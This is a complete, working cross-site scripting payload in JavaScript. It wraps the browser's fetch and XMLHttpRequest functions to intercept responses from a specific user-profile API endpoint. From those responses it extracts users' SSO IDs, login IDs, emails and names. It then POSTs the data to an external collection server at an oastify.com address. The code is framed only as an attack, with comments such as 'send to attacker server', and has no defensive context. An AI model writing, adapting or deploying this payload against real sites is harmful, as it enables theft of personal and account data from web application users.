// XSS Payload - Extract API responses and send to attacker server
(function() {
  // Target the specific API endpoint for user profile data
  const targetEndpoint = '/portal-profile-service/initNewPortalData';
  const attackerServer = 'https://nh8d7wmgsxld6hcm5ub72ejt0k6bu6iv.oastify.com/collect'; // Replace with your collection endpoint
  
  // Intercept fetch requests
  const originalFetch = window.fetch;
  window.fetch = function(...args) {
    const url = args[0];
    
    // If this is the target endpoint, log and exfiltrate the response
    if (url.includes(targetEndpoint)) {
      return originalFetch.apply(this, args).then(response => {
        // Clone the response to read it without consuming the original
        const clonedResponse = response.clone();
        
        clonedResponse.json().then(data => {
          // Extract only the sensitive fields you need
          const extractedData = {
            user: data.user ? {
              ssoId: data.user.ssoId,
              lastName: data.user.lastName,
              loginId: data.user.loginId,
              displayName: data.user.displayName,
              userId: data.user.userId,
              firstName: data.user.firstName,
              email: data.user.email,
              userType: data.user.userType
            } : null,
            timestamp: new Date().toISOString(),
            source: window.location.href
          };
          
          // Send exfiltrated data to attacker server
          fetch(attackerServer, {
            method: 'POST',
            headers: {
              'Content-Type': 'application/json'
            },
            body: JSON.stringify(extractedData)
          }).catch(err => console.log('Exfiltration sent'));
        }).catch(err => console.log('Response parsing error'));
        
        return response;
      });
    }
    
    return originalFetch.apply(this, args);
  };
  
  // Alternative: Use XMLHttpRequest interception as backup
  const originalXHR = XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open = function(method, url, ...rest) {
    if (url.includes(targetEndpoint)) {
      const originalOnReadyStateChange = this.onreadystatechange;
      this.onreadystatechange = function() {
        if (this.readyState === 4) {
          try {
            const responseData = JSON.parse(this.responseText);
            const extractedData = {
              user: responseData.user ? {
                ssoId: responseData.user.ssoId,
                lastName: responseData.user.lastName,
                loginId: responseData.user.loginId,
                displayName: responseData.user.displayName,
                userId: responseData.user.userId,
                firstName: responseData.user.firstName,
                email: responseData.user.email,
                userType: responseData.user.userType
              } : null,
              timestamp: new Date().toISOString(),
              source: window.location.href
            };
            
            fetch(attackerServer, {
              method: 'POST',
              headers: {
                'Content-Type': 'application/json'
              },
              body: JSON.stringify(extractedData)
            }).catch(err => {});
          } catch(e) {}
        }
        if (originalOnReadyStateChange) {
          originalOnReadyStateChange.call(this);
        }
      };
    }
    return originalXHR.apply(this, [method, url, ...rest]);
  };
  
  console.log('[XSS] Payload loaded - monitoring API calls');
})();
